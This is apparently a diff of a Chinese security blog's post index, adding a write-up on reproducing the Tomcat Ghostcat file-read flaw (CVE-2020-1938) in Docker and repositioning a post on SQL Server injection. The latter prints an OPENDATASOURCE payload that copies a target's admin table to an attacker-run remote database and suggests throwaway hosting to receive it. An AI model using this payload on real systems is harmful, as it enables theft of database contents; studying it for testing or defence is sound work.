@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>CVE-2020-1938</title>
+      <link href="/2020/02/24/Tomcat%20Ajp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-1938%EF%BC%89/"/>
+      <url>/2020/02/24/Tomcat%20Ajp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2020-1938%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）"><a href="#Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）" class="headerlink" title="Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）"></a>Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）</h2><p>最近的新漏洞，复现一下，顺便了解一下原理。</p><a id="more"></a><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>漏洞简介<br>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。<br>由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-1938</a></p><p>影响范围<br>Apache Tomcat 6<br>Apache Tomcat 7 &lt; 7.0.100<br>Apache Tomcat 8 &lt; 8.5.51<br>Apache Tomcat 9 &lt; 9.0.31</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。</p><h3 id="docker基本命令"><a href="#docker基本命令" class="headerlink" title="docker基本命令"></a>docker基本命令</h3><blockquote><p>docker run ubuntu:15.10 /bin/echo “Hello world”</p></blockquote><ul><li><strong>docker:</strong> Docker 的二进制执行文件。</li><li><strong>run:</strong> 与前面的 docker 组合来运行一个容器。</li><li><strong>ubuntu:15.10</strong> 指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像。</li><li><strong>/bin/echo “Hello world”:</strong> 在启动的容器里执行的命令</li></ul><blockquote><p>docker run -i -t ubuntu:15.10 /bin/bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> root@0123ce188bd8:/<span class="comment">#</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><ul><li><strong>-t:</strong> 在新容器内指定一个伪终端或终端。</li><li><strong>-i:</strong> 允许你对容器内的标准输入 (STDIN) 进行交互。</li></ul><blockquote><p>docker run -d ubuntu:15.10 /bin/sh -c “while true; do echo hello world; sleep 1; done”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> 2b1b7a428627c51ab8810d541d759f072b4fc75487eed05812646b8534a2fe63</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure></blockquote><p>-d参数：后台运行容器，并返回容器ID。 </p><p>可以通过docker stop停止。</p><h3 id="使用docker安装Tomcat"><a href="#使用docker安装Tomcat" class="headerlink" title="使用docker安装Tomcat"></a>使用docker安装Tomcat</h3><p><img src="https://s2.ax1x.com/2020/02/24/337thV.jpg" alt="337thV.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38tsl4.jpg" alt="38tsl4.jpg"></p><h3 id="启动镜像"><a href="#启动镜像" class="headerlink" title="启动镜像"></a>启动镜像</h3><p><img src="https://s2.ax1x.com/2020/02/24/38wDsg.jpg" alt="38wDsg.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38w6ds.jpg" alt="38w6ds.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38wxyD.jpg" alt="38wxyD.jpg"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://s2.ax1x.com/2020/02/24/3G2HLq.jpg" alt="3G2HLq.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/3G2OoT.jpg" alt="3G2OoT.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/3GRSSJ.jpg" alt="3GRSSJ.jpg"></p><p><a href="https://imgchr.com/i/3GRiex" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/24/3GRiex.jpg" alt="3GRiex.jpg"></a></p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>问题：docker拖取镜像速度及其缓慢，换成中科大的源无解</p><p>解决：修改或新增 /etc/docker/daemon.json( sudo vim /etc/docker/daemon.json )，加入如下内容</p><p>{</p><p>“registry-mirrors”: [“<a href="http://hub-mirror.c.163.com&quot;]" target="_blank" rel="noopener">http://hub-mirror.c.163.com&quot;]</a></p><p>}</p><p>systemctl restart docker.service</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CVE-2020-1938 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>BlusCMS审计</title>
       <link href="/2020/02/21/bluscms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
       <url>/2020/02/21/bluscms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
@@ -393,6 +418,31 @@
     
     
     <entry>
+      <title>SQLSever的反弹注入</title>
+      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
+      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p><a id="more"></a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>两数之和</title>
       <link href="/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
       <url>/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
@@ -435,31 +485,6 @@
         <tags>
             
             <tag> 整数反转 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQLSever的反弹注入</title>
-      <link href="/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
-      <url>/2019/10/14/sqlsever%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<p>主要是利用opendatasource函数，这个函数说白了就是把在某一个数据库查询的结果传输到另一个数据库的某个表中，但是有一个限制条件，就是接受数据的表的字段数必须和查询数据的表的字段数相同。</p><p>这种注入方式适用于没有回显的，注入工具注入不进去并且过于缓慢的（所以可以说是一种骚姿势？）</p><a id="more"></a><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=服务器;uid=登陆的用户名;pwd=登陆的密码;database=数据库名'</span>).数据库名.dbo.数据库中的表名 <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><blockquote><p>select * from admin –</p></blockquote><p>是可以自定义的sql语句，但是要注意在sqlsever中#不能注释，要用–才可以</p><p>这个可以说是一个小知识点，但是有要求，需要接收数据的数据库有自己的公网ip。所以可以用十分钟邮箱</p><p><a href="http://note.youdao.com/" target="_blank" rel="noopener">http://24mail.chacuo.net/</a></p><p>到香港云注册一个新账号，香港云新账号可以试用一个60天的虚拟空间，虚拟空间有公网ip和sqlsever、mysql数据库，这样就可以不本地安装了</p><p>香港云<a href="http://note.youdao.com/" target="_blank" rel="noopener">http://www.webweb.com</a></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 渗透测试 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> sql注入 </tag>
             
         </tags>
       
